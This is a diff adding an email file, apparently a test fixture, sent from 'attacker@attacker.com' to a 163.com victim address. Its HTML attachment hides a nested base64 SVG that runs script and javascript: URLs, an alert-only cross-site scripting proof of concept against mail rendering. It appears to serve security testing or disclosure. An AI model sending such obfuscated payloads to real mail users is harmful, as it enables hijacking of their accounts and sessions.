@@ -1,0 +1,26 @@
+From: <attacker@attacker.com>
+Subject: tww
+To: victim@163.com
+MIME-Version: 1.0
+Content-type: multipart/mixed;
+	boundary="----=_Part_192061_1556421578.1563869810627"
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_192063_26965953.1563869810627"
+
+------=_Part_192063_26965953.1563869810627
+Content-Type: text/plain; charset=GBK
+Content-Transfer-Encoding: 7bit
+
+bbbb
+
+------=_Part_192063_26965953.1563869810627--
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: text/html; name="test.htm"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="test.htm"
+
+Jmx0O3N2ZyZndDsmbHQ7dXNlIHhsaW5rOmhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5QnBaRDBpY21WamRHRnVaMnhsSWlCNGJXeHVjejBpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2TWpBd01DOXpkbWNpSUhodGJHNXpPbmhzYVc1clBTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1TDNoc2FXNXJJaUFnSUNCM2FXUjBhRDBpTVRBd0lpQm9aV2xuYUhROUlqRXdNQ0krUEhOamNtbHdkRDVoYkdWeWRDZ3hLVHd2YzJOeWFYQjBQZzBLSUR4bWIzSmxhV2R1VDJKcVpXTjBJSGRwWkhSb1BTSXhNREFpSUdobGFXZG9kRDBpTlRBaURRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjbVZ4ZFdseVpXUkZlSFJsYm5OcGIyNXpQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh4T1RrNUwzaG9kRzFzSWo0TkNnazhaVzFpWldRZ2VHMXNibk05SW1oMGRIQTZMeTkzZDNjdWR6TXViM0puTHpFNU9Ua3ZlR2gwYld3aUlITnlZejBpYW1GMllYTmpjbWx3ZERwaGJHVnlkQ2hzYjJOaGRHbHZiaWtpSUM4K0RRb2dJQ0FnUEM5bWIzSmxhV2R1VDJKcVpXTjBQZzBLUEM5emRtYysiLyZndDsmbHQ7L3N2ZyZndDs=
+------=_Part_192061_1556421578.1563869810627--
